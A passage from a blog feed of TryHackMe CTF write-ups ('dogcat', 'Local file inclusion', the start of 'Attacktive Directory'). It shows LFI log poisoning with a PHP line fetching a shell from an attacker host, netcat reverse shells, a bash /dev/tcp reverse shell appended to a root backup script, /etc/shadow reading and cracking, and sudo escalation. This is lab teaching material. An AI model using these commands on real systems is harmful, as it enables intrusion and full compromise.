&lt;/script&gt;&lt;iframe sandbox="allow-scripts" security="restricted" src="https://www.hackingarticles.in/apache-log-poisoning-through-lfi/embed/" width="600" height="338" title="&amp;#8220;Apache Log Poisoning through LFI&amp;#8221; &amp;#8212; Hacking Articles" frameborder="0" marginwidth="0" marginheight="0" scrolling="no" class="wp-embedded-content"&gt;&lt;/iframe&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card kg-card-hascaption"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-19-at-09.44.22.png" class="kg-image" alt="dogcat | THM write-up"&gt;&lt;figcaption&gt;&amp;lt;?php file_put_contents('shell.php', file_get_contents('http://[your-host]/shell.php'))?&amp;gt;&lt;/figcaption&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-19-at-09.44.48.png" class="kg-image" alt="dogcat | THM write-up"&gt;&lt;/figure&gt;&lt;pre&gt;&lt;code&gt;root@kali:~/php-reverse-shell-1.0# python -m SimpleHTTPServer 8083
Serving HTTP on 0.0.0.0 port 8083 ...
10.10.67.111 - - [19/Apr/2020 08:43:17] "GET /rev.php HTTP/1.0" 200 -
&lt;/code&gt;&lt;/pre&gt;&lt;figure class="kg-card kg-code-card"&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.179.59] from (UNKNOWN) [10.10.67.111] 46238
Linux 4457cb6e9a51 4.15.0-96-generic #97-Ubuntu SMP Wed Apr 1 03:25:46 UTC 2020 x86_64 GNU/Linux
 08:44:38 up 10 min,  0 users,  load average: 0.00, 0.04, 0.04
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ sudo -l
Matching Defaults entries for www-data on 4457cb6e9a51:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on 4457cb6e9a51:
    (root) NOPASSWD: /usr/bin/env
$&lt;/code&gt;&lt;/pre&gt;&lt;figcaption&gt;And we are user www-data, You can get the flags 1, 2, and 3. Notice that the user can run /usr/bin/env as root without password, we'll priv esc using that&lt;/figcaption&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-code-card"&gt;&lt;pre&gt;&lt;code&gt;find / -type f -name flag4* 2&amp;gt;/dev/null&lt;/code&gt;&lt;/pre&gt;&lt;figcaption&gt;tried to search for flag4, but there's no sign&lt;/figcaption&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-code-card"&gt;&lt;pre&gt;&lt;code&gt;$ sudo /usr/bin/env /bin/sh -p
id
uid=0(root) gid=0(root) groups=0(root)
cd /root
pwd
/root
hostname
4457cb6e9a51


&lt;/code&gt;&lt;/pre&gt;&lt;figcaption&gt;enumerating more our user figured out that we are in a docker container.&lt;/figcaption&gt;&lt;/figure&gt;&lt;blockquote&gt;Escaping the container&lt;/blockquote&gt;&lt;p&gt;I will leave an article that can give you an idea about containers escaping and how it can be very useful in a lot of cases for pentester.&lt;/p&gt;&lt;figure class="kg-card kg-bookmark-card"&gt;&lt;a class="kg-bookmark-container" href="https://www.bleepingcomputer.com/news/security/escaping-containers-to-execute-commands-on-play-with-docker-servers/"&gt;&lt;div class="kg-bookmark-content"&gt;&lt;div class="kg-bookmark-title"&gt;Escaping Containers to Execute Commands on Play with Docker Servers&lt;/div&gt;&lt;div class="kg-bookmark-description"&gt;Improperly secured privileged containers on the Play with Docker testing platform offered security researchers a way to escape Linux containers and run arbitrary code on the host system.&lt;/div&gt;&lt;div class="kg-bookmark-metadata"&gt;&lt;img class="kg-bookmark-icon" src="https://www.bleepstatic.com/favicon/bleeping.ico" alt="dogcat | THM write-up"&gt;&lt;span class="kg-bookmark-author"&gt;Ionut Ilascu&lt;/span&gt;&lt;span class="kg-bookmark-publisher"&gt;BleepingComputer.com&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class="kg-bookmark-thumbnail"&gt;&lt;img src="https://www.bleepstatic.com/content/posts/2019/01/14/PleywithDocker_logo.png" alt="dogcat | THM write-up"&gt;&lt;/div&gt;&lt;/a&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-code-card"&gt;&lt;pre&gt;&lt;code&gt;cd /opt
ls
backups
cd backups
ls
backup.sh
backup.tar
cat backup.sh   
#!/bin/bash
tar cf /root/container/backup/backup.tar /root/container

&lt;/code&gt;&lt;/pre&gt;&lt;figcaption&gt;we have a backup.sh that runs every minute, taking the backup.tar to &lt;strong&gt;/root/container &lt;/strong&gt;adding a reverse shell to the backup script may give us access to the host root. Since it interacts with the host root folders, the backup.sh is probably created by the host and ran by the host&lt;/figcaption&gt;&lt;/figure&gt;&lt;pre&gt;&lt;code&gt;pwd 
/opt/backups
ls  
backup.sh
backup.tar
echo 'bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.179.59/7263 0&amp;gt;&amp;amp;1' &amp;gt;&amp;gt; backup.sh

&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# nc -lvnp 7263
listening on [any] 7263 ...
connect to [10.10.179.59] from (UNKNOWN) [10.10.67.111] 53868
bash: cannot set terminal process group (4298): Inappropriate ioctl for device
bash: no job control in this shell
root@dogcat:~# id
id
uid=0(root) gid=0(root) groups=0(root)
root@dogcat:~# ls
ls
container
flag4.txt
root@dogcat:~#&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And we are root user at the host dogcat. Honestly, I learned a lot from this challenge I hope you found this write-up useful, feel free to leave a comment.&lt;/p&gt;&lt;p&gt;Happy Hacking!&lt;/p&gt;&lt;figure class="kg-card kg-bookmark-card"&gt;&lt;a class="kg-bookmark-container" href="https://tryhackme.com/room/dogcat"&gt;&lt;div class="kg-bookmark-content"&gt;&lt;div class="kg-bookmark-title"&gt;TryHackMe | dogcat&lt;/div&gt;&lt;div class="kg-bookmark-description"&gt;I made a website where you can look at pictures of dogs and/or cats!&lt;/div&gt;&lt;div class="kg-bookmark-metadata"&gt;&lt;img class="kg-bookmark-icon" src="https://tryhackme.com/img/favicon.png" alt="dogcat | THM write-up"&gt;&lt;span class="kg-bookmark-publisher"&gt;TryHackMe&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class="kg-bookmark-thumbnail"&gt;&lt;img src="https://tryhackme-images.s3.amazonaws.com/room-icons/ec494890e8b7572b239164245663de13.png" alt="dogcat | THM write-up"&gt;&lt;/div&gt;&lt;/a&gt;&lt;/figure&gt;</content:encoded></item><item><title>Local file inclusion | write-up</title><description>&lt;p&gt;Hello everyone, here's a quick write-up about LFI that I really recommend for people just starting in the field. It's created by a user called &lt;a href="https://tryhackme.com/p/falconfeast"&gt;&lt;strong&gt;falconfeast&lt;/strong&gt;&lt;/a&gt;&lt;strong&gt; &lt;/strong&gt;feel free to visit his room.&lt;/p&gt;&lt;figure class="kg-card kg-bookmark-card"&gt;&lt;a class="kg-bookmark-container" href="https://tryhackme.com"&gt;&lt;div class="kg-bookmark-content"&gt;&lt;div class="kg-bookmark-title"&gt;TryHackMe | Hacking Training&lt;/div&gt;&lt;div class="kg-bookmark-description"&gt;An online platform for learning and teaching cyber security, all through your browser.&lt;/div&gt;&lt;div class="kg-bookmark-metadata"&gt;&lt;img class="kg-bookmark-icon" src="https://tryhackme.com/img/favicon.png"&gt;&lt;span class="kg-bookmark-publisher"&gt;TryHackMe&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class="kg-bookmark-thumbnail"&gt;&lt;img src="https://tryhackme.com/img/favicon.png"&gt;&lt;/div&gt;&lt;/a&gt;&lt;/figure&gt;&lt;blockquote&gt;Enumeration&lt;/blockquote&gt;</description><link>http://localhost:2368/lfi/</link><guid isPermaLink="false">5e99fe71da86f68ecc6f05e7</guid><dc:creator>fr33s0ul</dc:creator><pubDate>Fri, 17 Apr 2020 19:48:26 GMT</pubDate><media:content url="http://localhost:2368/content/images/2020/04/653aa50b92574882f.png" medium="image"/><content:encoded>&lt;img src="http://localhost:2368/content/images/2020/04/653aa50b92574882f.png" alt="Local file inclusion | write-up"&gt;&lt;p&gt;Hello everyone, here's a quick write-up about LFI that I really recommend for people just starting in the field. It's created by a user called &lt;a href="https://tryhackme.com/p/falconfeast"&gt;&lt;strong&gt;falconfeast&lt;/strong&gt;&lt;/a&gt;&lt;strong&gt; &lt;/strong&gt;feel free to visit his room.&lt;/p&gt;&lt;figure class="kg-card kg-bookmark-card"&gt;&lt;a class="kg-bookmark-container" href="https://tryhackme.com"&gt;&lt;div class="kg-bookmark-content"&gt;&lt;div class="kg-bookmark-title"&gt;TryHackMe | Hacking Training&lt;/div&gt;&lt;div class="kg-bookmark-description"&gt;An online platform for learning and teaching cyber security, all through your browser.&lt;/div&gt;&lt;div class="kg-bookmark-metadata"&gt;&lt;img class="kg-bookmark-icon" src="https://tryhackme.com/img/favicon.png" alt="Local file inclusion | write-up"&gt;&lt;span class="kg-bookmark-publisher"&gt;TryHackMe&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class="kg-bookmark-thumbnail"&gt;&lt;img src="https://tryhackme.com/img/favicon.png" alt="Local file inclusion | write-up"&gt;&lt;/div&gt;&lt;/a&gt;&lt;/figure&gt;&lt;blockquote&gt;Enumeration &lt;/blockquote&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# nmap -sC -sV 10.10.104.39
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-17 19:00 UTC
Nmap scan report for ip-10-10-104-39.eu-west-1.compute.internal (10.10.104.39)
Host is up (0.00079s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a8:b9:f0:d3:e4:b3:17:9c:7f:b6:7d:28:72:8a:e4:77 (RSA)
|   256 07:f2:d9:85:77:74:52:2a:73:76:70:35:73:70:c3:9e (ECDSA)
|_  256 23:ba:e8:b6:8b:a2:ac:58:3b:f4:04:dc:6e:36:b7:f2 (ED25519)
80/tcp open  http    Werkzeug httpd 0.16.1 (Python 3.6.9)
|_http-title: Shop
MAC Address: 02:24:A4:61:CD:74 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.74 seconds
root@kali:~#&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# dirb http://10.10.104.39

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Fri Apr 17 19:23:58 2020
URL_BASE: http://10.10.104.39/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.104.39/ ----
+ http://10.10.104.39/home (CODE:200|SIZE:4116)                                    
                                                                                   
-----------------
END_TIME: Fri Apr 17 19:25:08 2020
DOWNLOADED: 4612 - FOUND: 1
root@kali:~#&lt;/code&gt;&lt;/pre&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-17-at-20.08.52.png" class="kg-image" alt="Local file inclusion | write-up"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-17-at-20.42.18.png" class="kg-image" alt="Local file inclusion | write-up"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-17-at-20.10.15.png" class="kg-image" alt="Local file inclusion | write-up"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/sc.png" class="kg-image" alt="Local file inclusion | write-up"&gt;&lt;/figure&gt;&lt;p&gt;I next tried to see if the user falcon have access to &lt;strong&gt;/etc/shadow &lt;/strong&gt;and yes ... &lt;/p&gt;&lt;!--kg-card-begin: html--&gt;&lt;iframe src="https://giphy.com/embed/rlL4XHR60GPew" width="480" height="341" frameborder="0" class="giphy-embed" allowfullscreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href="https://giphy.com/gifs/transparent-rlL4XHR60GPew"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;!--kg-card-end: html--&gt;&lt;p&gt;Let's decrypt the hash and see if we have any luck on this one&lt;/p&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# john hash --wordlist=/usr/share/wordlists/rockyou.txt 
Created directory: /root/.john
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
xxxxxxxxxx       (falcon)
1g 0:00:00:07 DONE (2020-04-17 19:23) 0.1254g/s 2376p/s 2376c/s 2376C/s soldado..playas
Use the "--show" option to display all of the cracked passwords reliably
Session completed
root@kali:~#&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# ssh falcon@10.10.104.39
The authenticity of host '10.10.104.39 (10.10.104.39)' can't be established.
ECDSA key fingerprint is SHA256:K4V/ri6osqzorAUTBrYc1jiyx8Uiy22Uf1qqH6O4Iho.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes            
Warning: Permanently added '10.10.104.39' (ECDSA) to the list of known hosts.       
falcon@10.10.104.39's password:                                                     
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-76-generic x86_64)                  
                                                                                    
 * Documentation:  https://help.ubuntu.com                                          
 * Management:     https://landscape.canonical.com                                  
 * Support:        https://ubuntu.com/advantage                                     
                                                                                    
  System information as of Sat Apr 18 00:54:49 IST 2020                             
                                                                                    
  System load:  0.72              Processes:           84                           
  Usage of /:   31.4% of 9.78GB   Users logged in:     0                            
  Memory usage: 16%               IP address for eth0: 10.10.104.39                 
  Swap usage:   0%                                                                  
                                                                                    
                                                                                    
6 packages can be updated.                                                          
3 updates are security updates.                                                     
                                                                                    
                                                                                    
Last login: Wed Jan 29 20:13:44 2020 from 192.168.1.107                             
falcon@walk:~$                                                                      
              &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;and we are user falcon, I'm pretty sure that there's another way in so feel free to dive in.&lt;/p&gt;&lt;figure class="kg-card kg-code-card"&gt;&lt;pre&gt;&lt;code&gt;falcon@walk:~$ ls                                                                   
user.txt                                                                            
falcon@walk:~$ cat user.txt                                                         
XXXXXXXXXXXXXXXXXXXX                                                                
falcon@walk:~$ sudo -l
Matching Defaults entries for falcon on walk:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User falcon may run the following commands on walk:
    (root) NOPASSWD: /bin/journalctl
falcon@walk:~$&lt;/code&gt;&lt;/pre&gt;&lt;figcaption&gt;The user can use /bin/journalctl as root without password.&lt;/figcaption&gt;&lt;/figure&gt;&lt;pre&gt;&lt;code&gt;falcon@walk:~$ sudo /bin/journalctl 
-- Logs begin at Tue 2020-01-28 19:00:21 IST, end at Sat 2020-04-18 00:58:39 IST. --
Jan 28 19:00:21 walk kernel: Linux version 4.15.0-20-generic (buildd@lgw01-amd64-039
Jan 28 19:00:21 walk kernel: Command line: BOOT_IMAGE=/boot/vmlinuz-4.15.0-20-generi
Jan 28 19:00:21 walk kernel: KERNEL supported cpus:
Jan 28 19:00:21 walk kernel:   Intel GenuineIntel
Jan 28 19:00:21 walk kernel:   AMD AuthenticAMD
Jan 28 19:00:21 walk kernel:   Centaur CentaurHauls
Jan 28 19:00:21 walk kernel: x86/fpu: Supporting XSAVE feature 0x001: 'x87 floating 
Jan 28 19:00:21 walk kernel: x86/fpu: Supporting XSAVE feature 0x002: 'SSE registers
Jan 28 19:00:21 walk kernel: x86/fpu: Supporting XSAVE feature 0x004: 'AVX registers
Jan 28 19:00:21 walk kernel: x86/fpu: xstate_offset[2]:  576, xstate_sizes[2]:  256
Jan 28 19:00:21 walk kernel: x86/fpu: Enabled xstate features 0x7, context size is 8
Jan 28 19:00:21 walk kernel: e820: BIOS-provided physical RAM map:
Jan 28 19:00:21 walk kernel: BIOS-e820: [mem 0x0000000000000000-0x000000000009fbff] 
Jan 28 19:00:21 walk kernel: BIOS-e820: [mem 0x000000000009fc00-0x000000000009ffff] 
Jan 28 19:00:21 walk kernel: BIOS-e820: [mem 0x00000000000f0000-0x00000000000fffff] 
Jan 28 19:00:21 walk kernel: BIOS-e820: [mem 0x0000000000100000-0x000000003ffeffff] 
Jan 28 19:00:21 walk kernel: BIOS-e820: [mem 0x000000003fff0000-0x000000003fffffff] 
Jan 28 19:00:21 walk kernel: BIOS-e820: [mem 0x00000000fec00000-0x00000000fec00fff] 
Jan 28 19:00:21 walk kernel: BIOS-e820: [mem 0x00000000fee00000-0x00000000fee00fff] 
Jan 28 19:00:21 walk kernel: BIOS-e820: [mem 0x00000000fffc0000-0x00000000ffffffff] 
Jan 28 19:00:21 walk kernel: NX (Execute Disable) protection: active
Jan 28 19:00:21 walk kernel: random: fast init done
Jan 28 19:00:21 walk kernel: SMBIOS 2.5 present.
Jan 28 19:00:21 walk kernel: DMI: innotek GmbH VirtualBox/VirtualBox, BIOS VirtualBo
Jan 28 19:00:21 walk kernel: Hypervisor detected: KVM
Jan 28 19:00:21 walk kernel: e820: update [mem 0x00000000-0x00000fff] usable ==&amp;gt; res
Jan 28 19:00:21 walk kernel: e820: remove [mem 0x000a0000-0x000fffff] usable
Jan 28 19:00:21 walk kernel: e820: last_pfn = 0x3fff0 max_arch_pfn = 0x400000000
Jan 28 19:00:21 walk kernel: MTRR default type: uncachable
Jan 28 19:00:21 walk kernel: MTRR variable ranges disabled:
Jan 28 19:00:21 walk kernel: MTRR: Disabled
Jan 28 19:00:21 walk kernel: x86/PAT: MTRRs disabled, skipping PAT initialization to
Jan 28 19:00:21 walk kernel: CPU MTRRs all blank - virtualized system.
Jan 28 19:00:21 walk kernel: x86/PAT: Configuration [0-7]: WB  WT  UC- UC  WB  WT  U
Jan 28 19:00:21 walk kernel: found SMP MP-table at [mem 0x0009fff0-0x0009ffff] mappe
Jan 28 19:00:21 walk kernel: Scanning 1 areas for low memory corruption
Jan 28 19:00:21 walk kernel: Base memory trampoline at [        (ptrval)] 99000 size
Jan 28 19:00:21 walk kernel: BRK [0x2493e000, 0x2493efff] PGTABLE
Jan 28 19:00:21 walk kernel: BRK [0x2493f000, 0x2493ffff] PGTABLE
Jan 28 19:00:21 walk kernel: BRK [0x24940000, 0x24940fff] PGTABLE
Jan 28 19:00:21 walk kernel: BRK [0x24941000, 0x24941fff] PGTABLE
Jan 28 19:00:21 walk kernel: BRK [0x24942000, 0x24942fff] PGTABLE
Jan 28 19:00:21 walk kernel: RAMDISK: [mem 0x31777000-0x34bb2fff]
Jan 28 19:00:21 walk kernel: ACPI: Early table checksum verification disabled
Jan 28 19:00:21 walk kernel: ACPI: RSDP 0x00000000000E0000 000024 (v02 VBOX  )
Jan 28 19:00:21 walk kernel: ACPI: XSDT 0x000000003FFF0030 00003C (v01 VBOX   VBOXXS
Jan 28 19:00:21 walk kernel: ACPI: FACP 0x000000003FFF00F0 0000F4 (v04 VBOX   VBOXFA
!/bin/sh
# id
uid=0(root) gid=0(root) groups=0(root)
# ls -la /root
total 32
drwx------  5 root root 4096 Jan 30 21:41 .
drwxr-xr-x 23 root root 4096 Jan 28 19:29 ..
lrwxrwxrwx  1 root root    9 Jan 30 21:41 .bash_history -&amp;gt; /dev/null
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
drwx------  3 root root 4096 Jan 28 23:21 .cache
drwx------  3 root root 4096 Jan 28 19:14 .gnupg
drwxr-xr-x  3 root root 4096 Jan 28 23:11 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   21 Jan 29 19:52 root.txt
# 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;and we are root ! Enjoy your flags.&lt;/p&gt;&lt;p&gt;Happy Hacking!&lt;/p&gt;</content:encoded></item><item><title>Attacktive Directory | THM write-up</title><description>&lt;p&gt;Hello world! today's challenge is very unique, we will go through the steps to exploit an active directory. The challenge is designed by a user called &lt;strong&gt;Sp00ky&lt;/strong&gt;.&lt;br&gt;in my opinion, anyone who wants to get close to active directory exploitation this is the one for you, the amount of knowledge&lt;/p&gt;</description><link>http://localhost:2368/attacktive-directory-thm-write-up/</link><guid isPermaLink="false">5e998781da86f68ecc6f04ae</guid><dc:creator>fr33s0ul</dc:creator><pubDate>Fri, 17 Apr 2020 14:53:35 GMT</pubDate><media:content url="http://localhost:2368/content/images/2020/04/aD.png" medium="image"/><content:encoded>&lt;img src="http://localhost:2368/content/images/2020/04/aD.png" alt="Attacktive Directory | THM write-up"&gt;&lt;p&gt;Hello world! today's challenge is very unique, we will go through the steps to exploit an active directory. The challenge is designed by a user called &lt;strong&gt;Sp00ky&lt;/strong&gt;.&lt;br&gt;in my opinion, anyone who wants to get close to active directory exploitation this is the one for you, the amount of knowledge you'll learn is just amazing, because Active directories use different protocols. You'll learn a lot about Kerberos and how to crack their hashes, and how to use Impacket Secretsdump to dump Domain-Control hashes, and how to access the machine with only NTLM hash with Evil-WinRM ...&lt;/p&gt;&lt;blockquote&gt;Enumeration&lt;/blockquote&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# nmap -p- -A -nP 10.10.203.152
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-17 10:37 UTC
Nmap scan report for 10.10.203.152
Host is up (0.00043s latency).
Not shown: 65508 closed ports
PORT      STATE SERVICE       VERSION
53/tcp    open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-04-17 10:43:23Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: THM-AD
|   NetBIOS_Domain_Name: THM-AD
|   NetBIOS_Computer_Name: ATTACKTIVEDIREC
|   DNS_Domain_Name: spookysec.local
|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local
|   Product_Version: 10.0.17763
|_  System_Time: 2020-04-17T10:45:49+00:00
| ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local
| Not valid before: 2020-04-03T18:40:09
|_Not valid after:  2020-10-03T18:40:09
|_ssl-date: 2020-04-17T10:46:02+00:00; 0s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49671/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49684/tcp open  msrpc         Microsoft Windows RPC
49690/tcp open  msrpc         Microsoft Windows RPC
49789/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=4/17%Time=5E99884F%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
SF:x04bind\0\0\x10\0\x03");
MAC Address: 02:41:2E:CE:EA:1A (Unknown)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=4/17%OT=53%CT=1%CU=44531%PV=Y%DS=1%DC=D%G=Y%M=02412E%T
OS:M=5E998918%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=104%TI=I%CI=I%II=I
OS:%SS=S%TS=U)OPS(O1=M2301NW8NNS%O2=M2301NW8NNS%O3=M2301NW8%O4=M2301NW8NNS%
OS:O5=M2301NW8NNS%O6=M2301NNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W
OS:6=FF70)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M2301NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S
OS:=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y
OS:%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%
OS:O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=8
OS:0%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%
OS:Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=
OS:Y%DFI=N%T=80%CD=Z)

Network Distance: 1 hop
Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: ATTACKTIVEDIREC, NetBIOS user: &amp;lt;unknown&amp;gt;, NetBIOS MAC: 02:41:2e:ce:ea:1a (unknown)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2020-04-17T10:45:49
|_  start_date: N/A

TRACEROUTE
HOP RTT     ADDRESS
1   0.43 ms 10.10.203.152

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 550.50 seconds
root@kali:~#&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;running nmap will help us gather a lot of information about the Active directory and our target in general. for the next step, we will take the DNS domain name and add it to &lt;strong&gt;/etc/hosts&lt;/strong&gt; since we are practising in a local area network&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-17-at-11.07.30.png" class="kg-image" alt="Attacktive Directory | THM write-up"&gt;&lt;/figure&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# echo 10.10.237.175 spookysec.local &amp;gt;&amp;gt; /etc/hosts
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The next step, enumerating the two ports used by AD &lt;strong&gt;139&lt;/strong&gt; and &lt;strong&gt;445 &lt;/strong&gt;with enum4linux the flag -a stands for all simple enumeration, It will gather information for us including (userlist, machine list(s), sharelist, password policy information, group and member list, ...)&lt;/p&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# enum4linux -a spookysec.local
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Fri Apr 17 13:15:56 2020

 ========================== 
|    Target Information    |
 ========================== 
Target ........... spookysec.local
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ======================================================= 
|    Enumerating Workgroup/Domain on spookysec.local    |
 ======================================================= 
[+] Got domain/workgroup name: THM-AD

 =============================================== 
|    Nbtstat Information for spookysec.local    |
 =============================================== 
Looking up status of 10.10.237.175
        ATTACKTIVEDIREC &amp;lt;00&amp;gt; -         B &amp;lt;ACTIVE&amp;gt;  Workstation Service
        THM-AD          &amp;lt;00&amp;gt; - &amp;lt;GROUP&amp;gt; B &amp;lt;ACTIVE&amp;gt;  Domain/Workgroup Name
        THM-AD          &amp;lt;1c&amp;gt; - &amp;lt;GROUP&amp;gt; B &amp;lt;ACTIVE&amp;gt;  Domain Controllers
        THM-AD          &amp;lt;1b&amp;gt; -         B &amp;lt;ACTIVE&amp;gt;  Domain Master Browser
        ATTACKTIVEDIREC &amp;lt;20&amp;gt; -         B &amp;lt;ACTIVE&amp;gt;  File Server Service

        MAC Address = 02-4D-80-A3-99-4E

 ======================================== 
|    Session Check on spookysec.local    |
 ======================================== 
[+] Server spookysec.local allows sessions using username '', password ''

 ============================================== 
|    Getting domain SID for spookysec.local    |
 ============================================== 
Domain Name: THM-AD
Domain Sid: S-1-5-21-3591857110-2884097990-301047963
